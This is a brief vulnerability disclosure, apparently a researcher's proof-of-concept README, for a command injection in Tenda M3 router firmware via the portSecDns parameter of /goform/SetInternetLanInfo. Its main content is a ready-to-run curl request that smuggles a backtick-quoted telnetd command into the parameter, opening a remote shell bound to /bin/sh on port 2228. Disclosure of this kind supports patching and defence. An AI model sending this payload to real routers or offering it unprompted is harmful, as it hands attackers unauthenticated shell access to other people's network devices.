# Tenda M3 Command Injection

**Vender** ：Tenda

**Firmware version**:V1.0.0.12(4856)

**Exploit Author**: GD@hillstone

**Vendor Homepage**: https://www.tenda.com.cn/



## POC

An issue was discovered in Tenda M3 1.10 V1.0.0.12(4856) devices. An HTTP request parameter is used in command string construction within the handler function of the /goform/SetInternetLanInfo route. This could lead to Command Injection via Shell Metacharacters.

httpd:

![1](./1.jpg)

netctrl:

![2](./2.jpg)



libtpi.so:

![3](./3.jpg)

When we send packets, the router will be shell

```
curl -i -X POST http://192.168.10.1/goform/SetInternetLanInfo -d portSecDns='`telnetd -p 2228 -l /bin/sh`' -d portIp='192.168.10.1'  --cookie "user=admin"
```





![poc](./poc.jpg)

